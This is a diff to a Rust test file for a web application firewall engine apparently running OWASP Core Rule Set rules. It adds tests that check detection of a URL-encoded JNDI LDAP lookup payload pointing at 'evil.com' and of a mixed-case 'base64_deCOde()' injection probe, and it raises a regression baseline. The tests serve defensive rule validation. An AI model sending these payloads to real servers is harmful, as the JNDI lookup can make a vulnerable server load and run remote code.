@@ -228,6 +228,91 @@ fn fired_ids(
 }
 
 #[test]
+fn targeted_944150_json_evasion_fires() {
+    let Some(root) = crs_root() else {
+        return;
+    };
+    let engine = compile_full_set(&root.join("rules"));
+    let mut headers = BTreeMap::new();
+    headers.insert(
+        "Host".to_string(),
+        serde_yaml::Value::String("localhost".to_string()),
+    );
+    headers.insert(
+        "User-Agent".to_string(),
+        serde_yaml::Value::String("OWASP CRS test agent".to_string()),
+    );
+    headers.insert(
+        "Content-Type".to_string(),
+        serde_yaml::Value::String("application/json".to_string()),
+    );
+    let input = Input {
+        method: Some("POST".to_string()),
+        uri: Some("/post".to_string()),
+        headers: Some(headers),
+        data: Some(
+            "{\"foo\": \"%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}"
+                .to_string(),
+        ),
+        encoded_request: None,
+    };
+    // Introspect what the engine sees before asserting.
+    let mut parts = RequestParts::new("POST", "localhost", "/post");
+    for (name, value) in input.headers.as_ref().expect("headers") {
+        parts = parts.with_header(name.clone(), scalar(value));
+    }
+    parts = parts
+        .with_body(input.data.as_ref().expect("data").clone().into_bytes());
+    let request = Canonicalizer::default().canonicalize(parts);
+    let mut txn = SecLangTransaction::from_request(&request);
+    txn.tx_set("detection_paranoia_level", "1");
+    txn.tx_set("executing_paranoia_level", "1");
+    txn.tx_set("paranoia_level", "1");
+    let args: Vec<String> = txn
+        .resolve("ARGS")
+        .into_iter()
+        .chain(txn.resolve("ARGS_NAMES"))
+        .chain(txn.resolve("REQUEST_BODY"))
+        .map(|value| format!("{}={}", value.name, value.value))
+        .collect();
+    eprintln!("944150 debug values: {args:?}");
+    let fired = fired_ids(&engine, &input, 1);
+    assert!(
+        fired.contains(&944150),
+        "944150 did not fire; got {fired:?}"
+    );
+}
+
+#[test]
+fn targeted_933150_mixed_case_fires() {
+    let Some(root) = crs_root() else {
+        return;
+    };
+    let engine = compile_full_set(&root.join("rules"));
+    let mut headers = BTreeMap::new();
+    headers.insert(
+        "Host".to_string(),
+        serde_yaml::Value::String("localhost".to_string()),
+    );
+    headers.insert(
+        "User-Agent".to_string(),
+        serde_yaml::Value::String("OWASP CRS test agent".to_string()),
+    );
+    let input = Input {
+        method: Some("GET".to_string()),
+        uri: Some("/get?base64_deCOde()".to_string()),
+        headers: Some(headers),
+        data: None,
+        encoded_request: None,
+    };
+    let fired = fired_ids(&engine, &input, 1);
+    assert!(
+        fired.contains(&933150),
+        "933150 did not fire; got {fired:?}"
+    );
+}
+
+#[test]
 fn targeted_942410_regex_matches() {
     let Some(root) = crs_root() else {
         return;
@@ -510,7 +595,7 @@ fn crs_regression_corpus() {
 
     // Ratchet: raise only when the baseline genuinely improves.
     assert!(
-        passed >= 4854,
-        "CRS regression regressed: {passed} passed (baseline 4854)"
+        passed >= 4981,
+        "CRS regression regressed: {passed} passed (baseline 4981)"
     );
 }
